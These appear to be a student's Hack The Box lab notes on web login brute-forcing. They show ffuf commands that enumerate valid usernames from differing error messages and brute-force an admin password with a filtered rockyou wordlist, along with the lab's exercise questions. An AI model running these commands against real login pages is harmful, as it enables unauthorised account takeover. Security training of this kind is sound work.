# 🏍️ Brute-Force Attacks

## Enumerating Users

User enumeration vulnerabilities arise when a web application responds differently to registered/valid and invalid inputs for authentication endpoints

Let's imagine those 2 errors:

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption><p>User does not exist</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption><p>Just a wrong password </p></figcaption></figure>

To enumerate users via error messages, we will use the `xato-net-10-million-usernames.txt`

Let's imagine the following error message:

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

we can filter out invalid users by removing responses containing the string `Unknown user`

```shell-session
ffuf -w /opt/useful/SecLists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```

And when we identify a valid user, we can proceed to do bruteforce

_**Enumerate a valid user on the web application. Provide the username as the answer.**_

```
fuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -u http://94.237.56.194:35890/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

## Brute-Forcing Passwords

Let's imagine we got password policy going on and we're not sure about lockout policy, we can create wordlists according to the policy from famous wordlists to reduce noise:

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

```shell-session
ElFelixi0@htb[/htb]$ grep '[[:upper:]]' /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```

Once we got our user or our list of users and our post variable as well as the error messgae, we can start bruteforcing ->

```
ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```

_**What is the password of the user 'admin'?**_

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

```
grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

```
ffuf -w custom_wordlist.txt -u http://94.237.53.113:46749/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

### Password Reset Tokens
